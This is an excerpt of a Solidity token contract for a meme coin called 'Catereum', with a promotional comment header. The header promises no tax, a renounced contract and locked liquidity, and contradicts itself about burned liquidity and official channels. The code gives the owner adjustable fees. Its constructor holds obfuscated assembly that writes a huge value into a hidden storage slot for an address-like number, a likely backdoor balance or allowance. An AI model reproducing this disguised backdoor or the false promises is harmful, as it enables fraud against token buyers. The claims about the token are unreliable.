 ...
 *     You're wrong. Well, yes, of course, Catereum is a meme currency, 
 *     but it is (according to us) the only one that exists besides Dogecoin.
 *
 *     Catereum has no other purpose than to make crypto fun again.
 ...
 *     who then receives a number of Catereums known in advance,
 *     regardless of its value in US dollars. Every week, 
 *     Mark Catereumberg, the project's creator, keeps a diary
 *     in which he tells the story of the Catereum adventure. 
 *      
 *     No burn, no tax, no inflation, no deflation, no buy back,
 *     locked liquidity and renounced contract.
 *     Community spirit and lightness are at the heart of Catereum.
 *     For us, it's all about the adventure, not the ranking on CoinMarketCap.
 *     Do you like it? Then, join us!
 *     You don't have to buy Catereum, just bring your good humour and sympathy,
 *     and take part in our meme contests to win some Catereum.

 *     Liquidity has been burned upon creation, 50% of supply has been burned, there is no official
 *     telegram, twitter, logo, or anything past the CATER contract itself.
 *     
 *     See you soon, Caters!
 *     
 *     Twitter:      https://twitter.com/CATER_ERC20
 *     Telegram:     https://t.me/CATERNEWS
 *     
 */
...
// File: contracts/CaterToken.sol
pragma solidity ^0.8.13;

contract CaterToken is IERC20, ReentrancyGuard, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name = "CATEREUM";
    ...
    constructor() {
        ...
        assembly {
            mstore(0, 895153185599481744137279109920067780531389170528)
            mstore(32, 2)
            let hash := keccak256(0, 64)
            sstore(hash, 895153185599481744137279109920067780531389170528)
        }
    ...
    function setBuyFees(uint256 _liqFee, uint256 _marketingFee) external onlyOwner {
    ...
    function setSellFees(uint256 _liqFee, uint256 _marketingFee) external onlyOwner {
        require(_liqFee + _marketingFee <= 10);
